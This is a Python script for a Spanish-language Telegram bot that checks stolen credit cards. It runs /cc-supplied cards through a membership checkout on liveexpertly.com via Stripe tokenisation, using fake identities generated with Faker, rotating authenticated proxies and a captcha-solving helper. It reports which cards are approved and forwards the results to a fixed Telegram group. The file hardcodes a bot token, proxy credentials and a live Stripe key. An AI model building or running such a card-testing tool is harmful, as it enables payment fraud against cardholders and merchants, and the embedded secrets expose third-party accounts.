import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper

from curl_cffi import requests
from fake_useragent import UserAgent
TOKEN_ID = "5351340320:AAHobdGvFVxLLbaVHrc4frZvY2alDfd_6nM"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN_ID}/sendMessage"


from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext,Application,ContextTypes
import logging

def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
def ccn_gate(card):
    
            #============[Funcions Need]============#
             #============[Funcions Need]============#
            c = requests.Session()

            # Configura los proxies con autenticación
            proxies = {
                "http": "http://rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt@geo.iproyal.com:12321",
                "https": "http://rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt@geo.iproyal.com:12321",
            }

            # Asigna los proxies a la sesión
            c.proxies.update(proxies)
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#
            headers = {
                'authority': 'liveexpertly.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                # 'cookie': 'PHPSESSID=d10f15s7mt31a4bm2554r7su72; pmpro_visit=1; __stripe_sid=37a86df1-c0dd-4882-9b65-7e97008bcaf333b710; __stripe_mid=cb8faca5-8c35-426f-846a-6c7cd8245920027498',
                'pragma': 'no-cache',
                'referer': 'https://liveexpertly.com/membership-account/membership-levels/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'level': '1',
            }

            response = c.get(
                'https://liveexpertly.com/membership-account/membership-checkout/',
                params=params,
                headers=headers,
                proxies=proxys
            )
            print(response)
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=115610&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=cb8faca5-8c35-426f-846a-6c7cd8245920027498&sid=37a86df1-c0dd-4882-9b65-7e97008bcaf333b710&key=pk_live_Se2DgkT5sExZVlJeeDh72iLU009HNVQSoC&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[exp_month]={mes}&card[exp_year]={ano_number}&card[cvc]={cvv}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data, proxies=proxys)
            print(response)
            responsePm = json.loads(response.text)
            token = responsePm['id']
            headers = {
                'authority': 'liveexpertly.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'PHPSESSID=d10f15s7mt31a4bm2554r7su72; pmpro_visit=1; __stripe_sid=37a86df1-c0dd-4882-9b65-7e97008bcaf333b710; __stripe_mid=cb8faca5-8c35-426f-846a-6c7cd8245920027498',
                'origin': 'https://liveexpertly.com',
                'pragma': 'no-cache',
                'referer': 'https://liveexpertly.com/membership-account/membership-checkout/?level=1',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'level': '1',
            }

            data = {
                'level': '1',
                'checkjavascript': '1',
                'other_discount_code': '',
                'username': name+last+str(number),
                'password': 'saiper123',
                'password2': 'saiper123',
                'bemail': email,
                'bconfirmemail': email,
                'fullname': '',
                'CardType': 'Visa',
                'discount_code': '',
                'submit-checkout': '1',
                'javascriptok': '1',
                'stripeToken0': token,
                'AccountNumber': cc_number,
                'ExpirationMonth': mes,
                'ExpirationYear': ano_number,
            }

            responseChk = c.post(
                'https://liveexpertly.com/membership-account/membership-checkout/',
                params=params,
                headers=headers,
                data=data,
                proxies=proxys
            )
            soup = b(responseChk.text, 'html.parser')
            response_text = responseChk.text

            # Intentar parsear como JSON
           # Intentar parsear como JSON
            try:
                    response_data = json.loads(response_text)
                    
                    # Comprobar si hay errores
                    if response_data.get("HasErrors"):
                        errors = response_data.get("Errors", [])
                        if errors:
                            print(f"Error: {errors[0]}")
                            return errors[0]
                        else:
                            print("Error desconocido.")
                            return "Error desconocido."
                    else:
                        if response_data.get("LineItems") and response_data["LineItems"][0].get("Paid"):
                            print("Approved.")
                            return "Approved."
                        else:
                            print("Estado del pago desconocido.")
                            return "Estado del pago desconocido."
                            
            except json.JSONDecodeError:
                    # Si no es JSON, intentamos parsear el HTML
                    soup = b(response_text, 'html.parser')
                    
                    # Buscar div con clase y ID específicos
                    error_message = soup.find('div', {'class': 'pmpro_message pmpro_error', 'id': 'pmpro_message'})
                    
                    if error_message:
                        print(f"Error: {error_message.text.strip()}")
                        return error_message.text.strip()
                    else:
                        print("No se pudo encontrar un mensaje de error.")
                        return "No se pudo encontrar un mensaje de error."
                
           
           
        
            
        
   
    

import time
from telegram.constants import ParseMode  # Asegúrate de usar esta importación

# ID del grupo al que quieres enviar los mensajes
GRUPO_CHAT_ID = 846983753

async def cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        # Limita a un máximo de 10 tarjetas
        cards = context.args[:10]  # Toma solo las primeras 10 tarjetas si hay más

        # Mensaje inicial de procesamiento
        processing_message = await update.message.reply_text(
            "⏳ Procesando tarjetas... por favor, espera.",
            parse_mode=ParseMode.HTML
        )

        # Inicia el temporizador global
        start_time = time.time()

        results = []  # Lista para almacenar los resultados

        # Procesa cada tarjeta
        for card in cards:
            card_start_time = time.time()  # Temporizador por tarjeta
            result = ccn_gate(card)  # Procesa la tarjeta
            processing_time = time.time() - card_start_time  # Calcula tiempo de procesamiento

            # Guarda el resultado en la lista
            results.append(
                f"💳 <b>Tarjeta:</b> {card}\n"
                f"💬 <b>Resultado:</b> {result}\n"
                f"⏳ <b>Tiempo:</b> {processing_time:.2f} segundos\n"
                "───────────────"
            )

        # Calcula el tiempo total de procesamiento
        total_time = time.time() - start_time

        # Construye el mensaje final con todos los resultados
        final_message = (
            "✅ <b>Procesamiento completado</b>\n"
            + "\n".join(results)
        )

        # Edita el mensaje de "Procesando..." con el resultado final
        await processing_message.edit_text(final_message, parse_mode=ParseMode.HTML)

        # Enviar el mensaje final al grupo
        await context.bot.send_message(chat_id=GRUPO_CHAT_ID, text=final_message, parse_mode=ParseMode.HTML)

    else:
        error_message = (
            "⚠️ <b>Error:</b> Por favor, proporciona hasta 10 números de tarjeta después del comando /cc.\n"
            "Ejemplo: `/cc 1234 5678 9876 5432 1234 5678 9876 5432`"
        )
        await update.message.reply_text(error_message, parse_mode=ParseMode.HTML)
        await context.bot.send_message(chat_id=GRUPO_CHAT_ID, text=error_message, parse_mode=ParseMode.HTML)





# Configuración del bot
def main():
    # Usa 'Application' en lugar de 'Updater'
    application = Application.builder().token("5351340320:AAHobdGvFVxLLbaVHrc4frZvY2alDfd_6nM").build()

    # Añadir el manejador del comando /cc
    application.add_handler(CommandHandler("cc", cc_command))

    # Comienza el bot
    application.run_polling()

if __name__ == '__main__':
    main()